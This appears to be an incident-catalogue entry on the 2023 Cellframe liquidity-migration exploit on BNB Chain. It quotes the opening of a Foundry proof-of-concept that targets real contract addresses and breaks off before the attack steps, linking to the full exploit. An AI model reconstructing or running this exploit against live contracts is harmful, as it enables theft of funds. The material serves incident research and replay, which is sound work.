# [?] Cellframenet - Calculation issues during liquidity migration

## Summary
Severity: Unknown
Chain: BNB Chain
Component: Cellframe
Published: 2023-06-01
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-06/Cellframe_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~$76k

```solidity
contract ContractTest is Test {
    IDPPOracle DPPOracle = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
    IPancakeV3Pool PancakePool = IPancakeV3Pool(0xA2C1e0237bF4B58bC9808A579715dF57522F41b2);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    Uni_Pair_V2 CELL9 = Uni_Pair_V2(0x06155034f71811fe0D6568eA8bdF6EC12d04Bed2);
    IPancakePair PancakeLP = IPancakePair(0x1c15f4E3fd885a34660829aE692918b4b9C1803d);
    ILpMigration LpMigration = ILpMigration(0xB4E47c13dB187D54839cd1E08422Af57E5348fc1);
    IPancakeRouterV3 SmartRouter = IPancakeRouterV3(0x13f4EA83D0bd40E75C8222255bc855a974568Dd4);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 oldCELL = IERC20(0xf3E1449DDB6b218dA2C9463D4594CEccC8934346);
    IERC20 newCELL = IERC20(0xd98438889Ae7364c7E2A3540547Fad042FB24642);
    IERC20 BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    address public constant zap = 0x5E86bD98F7BEFBF5C602EdB5608346f65D9578c3;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 28_708_273);
        cheats.label(address(DPPOracle), "DPPOracle");
        cheats.label(address(PancakePool), "PancakePool");
        cheats.label(address(Router), "Router");
        cheats.label(address(PancakeLP), "PancakeLP");
        cheats.label(address(LpMigration), "LpMigration");
        cheats.label(address(SmartRouter), "SmartRouter");
        cheats.label(address(CELL9), "CELL9");
        cheats.label(address(WBNB), "WBNB");
        cheats.label(address(oldCELL), "oldCELL");
        cheats.label(address(newCELL), "newCELL");
        cheats.label(address(BUSD), "BUSD");
        cheats.label(zap, "Zap");
    }

    function testExploit() public {
        deal(address(WBNB), address(this), 0.1 ether);
        emit log_named_decimal_uint(
            "Attacker WBNB balance before attack", WBNB.balanceOf(address(this)), WBNB.decimals()
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-06/Cellframe_exp.sol_
